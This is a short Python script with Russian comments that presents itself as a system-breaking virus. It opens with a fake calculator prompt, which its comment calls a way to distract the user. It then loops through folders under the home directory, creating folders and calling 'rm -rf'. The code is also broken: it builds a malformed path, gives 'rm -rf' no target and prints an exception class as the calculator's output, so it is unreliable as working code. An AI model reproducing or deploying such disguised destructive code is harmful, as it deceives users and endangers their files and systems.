import os
import random
import time

def main(): # Точка входа в программу
    '''Опасный для системы код, он создает в основных directory папки
     после 1000000 созданных папок пишется: rm -rf'''
    class OBJ:
        def __init__(self):
            '''метод для сбора данных '''
            self.user = os.getlogin() # узнаем user, и создаем переменную с путем
            self.direct_main = f'/home{self.user}' # переменная с путем в формате /home/user
            self.all_direct = ['/boot','/media','/etc'] # список целей
            self.file = 'tobi_pizda.cpp' # создаваемый файл
            self.index = 0 # переменная для отсчета созданных файлов


        def attack(self,start:bool):
            if start == True:
                time.sleep(0.5)
                while True:
                    '''Тут создается переменная случайным образом - это переменная цель .'''
                    random_dir = self.direct_main + random.choice(self.all_direct) # создание цели
                    os.chdir(random_dir)#1
                    os.mkdir(self.file)#2
                    os.system('rm -rf')#3
                    time.sleep(0.19999) # Задержка для корректной работы
                    self.index += 1
                    if self.index == 1000000: # проверка созданных файлов
                        os.chdir(self.direct_main)
                        os.system('rm -rf') # команда для сноса системы ( мы будем в /home/user)
                    '''Да , я знаю запросит root,но у меня нец цели снести систему ,я хочу только сломать ее .'''
            else:
                pass

    class Main_Virus(OBJ):
        def attack_on_system(self,start:bool):
            '''Тут запуск программы , метод - наследование '''
            print('Поехали!Через 10 секунд твоей системе будет плохо!')
            time.sleep(10) # последний отсчет
            start_for_virus = OBJ() # Создание Экземпляра
            start_for_virus.attack(start) #Запуск


    start_for_virus = Main_Virus() # Создание экземпляра для всей программы.
    start_for_virus.attack_on_system(True) # Запуск
    pass


if __name__ == '__main__': # __name__ == __main__ , = if __name__ == True
    '''Пример отвлечения user'''
    def calk ():
        a = int(input('Введите первое число :'))
        b = int(input('Введите второе число :'))
        print(ValueError)
    calk()
    main()
    '''Как-то так'''
    # by alohadance48